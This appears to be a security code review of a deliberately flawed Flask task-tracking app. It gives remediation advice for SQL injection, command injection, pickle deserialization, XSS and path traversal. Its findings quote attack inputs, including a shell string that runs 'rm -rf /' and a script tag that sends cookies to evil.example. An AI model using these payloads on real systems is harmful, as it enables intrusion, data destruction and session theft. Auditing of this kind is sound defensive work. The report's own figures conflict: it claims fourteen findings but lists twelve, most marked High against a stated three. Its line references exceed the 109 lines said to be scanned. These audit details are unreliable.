# Security Code Review: TaskManager (Python/Flask)

**Audit date:** July 2, 2026
**Application under review:** `vulnerable_app.py` — a small internal Flask task-tracking app (registration/login, per-user task list, CSV export, admin reset, file retrieval, and a debug endpoint)
**Methodology:** Static analysis with Bandit (v1.9.4) + manual line-by-line inspection
**Lines of code scanned:** 109

---

## 1. Summary

The application has **14 confirmed findings**: 3 High, 8 Medium, 3 Low, spanning injection flaws, broken authentication, insecure deserialization, broken access control, and information disclosure. Several issues (SQL injection, command injection, MD5 password hashing, `debug=True`) were flagged by the automated scanner; others (XSS, path traversal, missing CSRF protection, unsigned session cookie, broken access control) required manual review because they depend on application logic Bandit cannot reason about. The combination of an unsigned identity cookie plus SQL injection in `/tasks` and `/export` means an attacker can escalate from "no account" to full database read/write and arbitrary shell command execution with minimal effort. **The application should not be deployed until Section 4 items are remediated.**

| Severity | Count |
|---|---|
| High | 3 |
| Medium | 8 |
| Low | 3 |

---

## 2. Tooling and Method

- **Static analyzer:** [Bandit](https://bandit.readthedocs.io/) run as `bandit -r app/`. Bandit is well-suited to Python because it walks the AST rather than pattern-matching text, so it catches things like `subprocess` calls with `shell=True` or use of `pickle`/`md5` regardless of formatting.
- **Manual inspection:** every route handler was read end-to-end, tracing each `request.*` input (form fields, query args, cookies, raw body) to see where it flowed — into a SQL string, a shell command, an HTML string, a filesystem path, or a deserializer. This is necessary because Bandit does not do taint tracking across variables/functions and cannot infer application-level logic flaws such as missing authorization checks or CSRF protection.
- Findings below are numbered and each includes: location, CWE classification, severity/impact, proof-of-concept sketch, and remediation.

---

## 3. Findings

### 3.1 SQL Injection (multiple locations) — **High**
**CWE-89** | Locations: `register()` L52-57, `login()` L67-69, `list_tasks()` L86, `export_tasks()` L111
Bandit: B608

User input (`username`, `password`, and the `user` cookie) is concatenated or `%`/f-string formatted directly into SQL text instead of being passed as bound parameters.

```python
query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + hash_password(password) + "'"
```

**Impact:** An attacker can log in without valid credentials (`' OR '1'='1`), read/modify arbitrary rows, or — since the `owner` cookie is trusted and re-used in `list_tasks()` — inject a `UNION SELECT` to read the `users` table (including password hashes) directly through `/tasks`.

**Remediation:** Use parameterized queries everywhere, exactly as `add_task()` already does correctly:
```python
user = conn.execute(
    "SELECT * FROM users WHERE username = ? AND password = ?",
    (username, hash_password(password)),
).fetchone()
```
Never build SQL with string concatenation, `%`, or f-strings, even for values that "look" server-controlled (the `owner` cookie is not).

---

### 3.2 Command Injection — **High**
**CWE-78** | Location: `export_tasks()` L109-112
Bandit: B602 / B608

```python
cmd = f"sqlite3 {DB_PATH} \".mode {fmt}\" \"SELECT * FROM tasks WHERE owner='{owner}';\" > /tmp/export_{owner}.txt"
subprocess.run(cmd, shell=True)
```
`fmt` (query string) and `owner` (cookie) are both attacker-controlled and land inside a shell command executed with `shell=True`.

**Impact:** Full remote code execution as the server process, e.g. `GET /export?format=csv"; rm -rf / #`.

**Remediation:** Never build shell strings from user input. Use the DB API directly instead of shelling out:
```python
import csv, io
rows = conn.execute("SELECT * FROM tasks WHERE owner = ?", (owner,)).fetchall()
# write rows with csv.writer instead of invoking the sqlite3 CLI
```
If an external process genuinely must be invoked, use `subprocess.run([...], shell=False)` with a list of arguments (never a formatted string), and validate `fmt` against an allow-list (`{"csv", "json"}`).

---

### 3.3 Insecure Deserialization — **Medium/High**
**CWE-502** | Location: `load_cache()` L117-121
Bandit: B301

```python
data = request.data
obj = pickle.loads(data)
```
`pickle.loads` on attacker-controlled bytes allows arbitrary code execution during deserialization — this is a textbook RCE gadget, not merely a data-integrity issue.

**Remediation:** Never unpickle untrusted input. Use `json.loads` for data interchange. If you need to cache complex Python objects internally, restrict the endpoint to trusted, authenticated internal callers only, or use a safe serialization format (JSON, MessagePack) with a strict schema.

---

### 3.4 Broken / Missing Authentication (unsigned identity cookie) — **High**
**CWE-287 / CWE-565** | Locations: `login()` L70-72, every route reading `request.cookies.get("user")`

The app treats a plain, unsigned cookie (`user=<username>`) as proof of identity:
```python
resp.set_cookie("user", username)
```
Any client can set `Cookie: user=alice` directly and be treated as `alice` — no signature, no session token, no expiry.

**Impact:** Complete authentication bypass; combined with 3.1, an attacker also doesn't need to guess a valid username since SQLi lets them read the `users` table first.

**Remediation:** Use Flask's built-in signed session (`flask.session`, backed by `SECRET_KEY`) or a vetted extension (Flask-Login) instead of a hand-rolled cookie. Set `Secure`, `HttpOnly`, and `SameSite=Lax/Strict` on session cookies. Store a server-side session ID, not the raw username.

---

### 3.5 Weak Password Hashing (MD5, unsalted) — **High**
**CWE-327 / CWE-916** | Location: `hash_password()` L43-44
Bandit: B324

```python
return hashlib.md5(pw.encode()).hexdigest()
```
MD5 is fast and unsalted, making offline cracking (rainbow tables, GPU brute force) trivial once the `users` table is exfiltrated (see 3.1).

**Remediation:** Use a slow, salted KDF designed for passwords: `bcrypt`, `argon2-cffi`, or `werkzeug.security.generate_password_hash` (PBKDF2 by default). Example:
```python
from werkzeug.security import generate_password_hash, check_password_hash
stored = generate_password_hash(password)
check_password_hash(stored, password)
```

---

### 3.6 Hardcoded Secrets and Credentials — **Medium**
**CWE-798 / CWE-259** | Locations: L20 (`app.secret_key`), L22 (`ADMIN_PASSWORD`)
Bandit: B105 (×2)

The Flask session-signing key and the admin password are literal strings in source control.

**Remediation:** Load secrets from environment variables or a secrets manager, never commit them:
```python
import os
app.secret_key = os.environ["FLASK_SECRET_KEY"]
```
Rotate any secret that has ever been committed, even if the repo is private.

---

### 3.7 Broken Access Control on Admin Function — **High**
**CWE-862 / CWE-352** | Location: `admin_reset()` L134-141

```python
@app.route("/admin/reset", methods=["GET", "POST"])
def admin_reset():
    pw = request.values.get("password")
    if pw == ADMIN_PASSWORD:
        ...
```
This is a destructive, state-changing action guarded only by a shared password compared with `==` (not constant-time), reachable via a plain `GET`, and with **no CSRF protection** — an attacker can trigger it by getting an authenticated admin's browser to load an `<img src="/admin/reset?password=admin123">` if the password ever leaks (and per 3.6 it's already in source).

**Remediation:**
- Require a real authenticated admin session (role-based check), not a shared password.
- Restrict destructive actions to `POST`/`DELETE`; never let `GET` change state.
- Add CSRF tokens (Flask-WTF's `CSRFProtect`) to all state-changing forms.
- Use `hmac.compare_digest` if a password/token comparison is ever unavoidable.

---

### 3.8 Reflected/Stored Cross-Site Scripting (XSS) — **Medium**
**CWE-79** | Location: `list_tasks()` L88-93

```python
html = "<h1>Tasks for %s</h1><ul>" % owner
...
html += f"<li>{r[1]} - ...</li>"
return render_template_string(html)
```
Both the `owner` value and each task's `title` are interpolated into HTML and rendered without escaping. `render_template_string` does auto-escape `{{ }}` expressions in Jinja2 templates — but here the untrusted data is spliced into the template *string itself* before Jinja ever sees it, so Jinja's autoescaping never applies.

**Impact:** A task titled `<script>document.location='https://evil.example/steal?c='+document.cookie</script>` executes for any user who views the list.

**Remediation:** Never build the template string from user input. Pass user data as template variables and let Jinja2 autoescape it:
```python
TEMPLATE = "<h1>Tasks for {{ owner }}</h1><ul>{% for t in tasks %}<li>{{ t.title }}</li>{% endfor %}</ul>"
return render_template_string(TEMPLATE, owner=owner, tasks=tasks)
```
Prefer `render_template()` with `.html` files over `render_template_string()` in general.

---

### 3.9 Path Traversal — **Medium**
**CWE-22** | Location: `read_file()` L144-148

```python
name = request.args.get("name")
path = os.path.join("uploads", name)
with open(path, "r") as f:
```
`os.path.join` does **not** sanitize `..`; `name=../../etc/passwd` (or an absolute path, which `os.path.join` will happily let override the base on POSIX/Windows) escapes the `uploads/` directory.

**Remediation:** Resolve and verify the final path stays under the intended root:
```python
base = os.path.realpath("uploads")
target = os.path.realpath(os.path.join(base, name))
if not target.startswith(base + os.sep):
    abort(403)
```
Better still, store an allow-list of valid file IDs server-side rather than accepting arbitrary filenames.

---

### 3.10 Sensitive Information Disclosure via Debug Endpoint — **High**
**CWE-215 / CWE-200** | Location: `debug_info()` L151-153

```python
@app.route("/debug")
def debug_info():
    return {"env": dict(os.environ), "secret_key": app.secret_key}
```
Unauthenticated endpoint dumps the full process environment (often containing DB credentials, API keys, cloud metadata tokens) and the Flask secret key needed to forge session cookies.

**Remediation:** Delete debug/diagnostic endpoints before merging to a production branch; if genuinely needed, gate behind authentication + an explicit `DEBUG` flag that defaults to `False`, and never expose `os.environ` or secrets in a response body.

---

### 3.11 Flask Debug Mode Enabled — **High**
**CWE-94** | Location: L158
Bandit: B201

```python
app.run(host="0.0.0.0", port=5000, debug=True)
```
`debug=True` enables the Werkzeug interactive debugger, which allows arbitrary Python code execution from the browser if an unhandled exception is triggered (the debugger PIN is derivable in many container/CI environments).

**Remediation:** `debug=False` in anything resembling a production entrypoint; use `FLASK_DEBUG` env var locally only, and run behind a real WSGI server (gunicorn/uwsgi) in production, never `app.run()`.

---

### 3.12 Binding to All Interfaces — **Medium**
**CWE-605** | Location: L158
Bandit: B104

`host="0.0.0.0"` exposes the dev server on every network interface, not just localhost, expanding the attack surface if run on a shared or cloud host without a firewall in front of it.

**Remediation:** Bind to `127.0.0.1` for local development; let the deployment layer (reverse proxy, container network policy) control external exposure explicitly.

---

## 4. Prioritized Remediation Plan

| Priority | Finding(s) | Why first |
|---|---|---|
| 1 (fix immediately) | 3.1 SQLi, 3.2 Command Injection, 3.3 Pickle deserialization, 3.10 Debug endpoint | Direct paths to full RCE or complete data exfiltration with no auth required |
| 2 | 3.4 Auth cookie, 3.7 Admin access control, 3.11 Debug mode | Removes the "walk right in" paths that make 1 trivial to reach |
| 3 | 3.5 MD5 hashing, 3.6 Hardcoded secrets | Limits blast radius once a breach occurs (credential reuse, offline cracking) |
| 4 | 3.8 XSS, 3.9 Path traversal, 3.12 Bind-all | Real risk, smaller blast radius than 1-2, still fix before release |

---

## 5. General Secure Coding Recommendations

1. **Parameterize everything.** No SQL string built by concatenation, `%`-format, or f-string — ever, including values you "trust" like cookies or config.
2. **Never call the shell with untrusted input.** Prefer library calls over `subprocess`+`shell=True`; if a subprocess is unavoidable, pass an argument list and validate/allow-list inputs.
3. **Don't deserialize untrusted data with `pickle`/`marshal`/`yaml.load` (unsafe loader).** Use JSON or a schema-validated format.
4. **Use framework session management, not homemade cookies.** Sign and encrypt session state; set `HttpOnly`, `Secure`, `SameSite`.
5. **Hash passwords with a slow, salted KDF** (argon2, bcrypt, PBKDF2) — never MD5/SHA1/unsalted SHA256.
6. **Keep secrets out of source.** Environment variables or a secrets manager; add secret-scanning (e.g., `gitleaks`, `trufflehog`) to CI.
7. **Enforce access control on every state-changing route**, tied to an authenticated identity and role — not a shared password compared with `==`.
8. **Add CSRF protection** (Flask-WTF `CSRFProtect`) to all forms/POST endpoints, and never allow `GET` to mutate state.
9. **Let your templating engine escape output.** Build templates with `{{ variable }}` placeholders and pass data as context — never format user data into template *source*.
10. **Validate and canonicalize file paths** before touching the filesystem; reject `..`/absolute paths, or better, avoid taking raw filenames from users at all.
11. **Remove debug endpoints and `debug=True` before shipping.** Treat any diagnostic route that dumps environment/config as a secret-leak by default.
12. **Bind services to the narrowest interface needed** and let the deployment/network layer manage external exposure.
13. **Wire static analysis into CI.** Run `bandit -r .` (and a dependency scanner like `pip-audit` or `safety`) on every PR; treat High findings as merge-blocking.
14. **Pin and audit dependencies.** `pip-audit` / GitHub Dependabot to catch known-vulnerable packages, since this review only covered first-party code.

---

## 6. Appendix: Raw Bandit Output

```
Run started:2026-07-02 08:51:38
Total issues (by severity): Low: 4, Medium: 6, High: 3   (11 automated findings)
Total issues (by confidence): Low: 3, Medium: 5, High: 5
```
Full tool output is included in `bandit_report.txt`. Findings 3.4 (broken auth), 3.7 (broken access control), 3.8 (XSS), and 3.9 (path traversal) were identified through manual review — Bandit's AST rules don't model application-level authorization or output-encoding logic, which is why manual review remains necessary alongside static analysis.
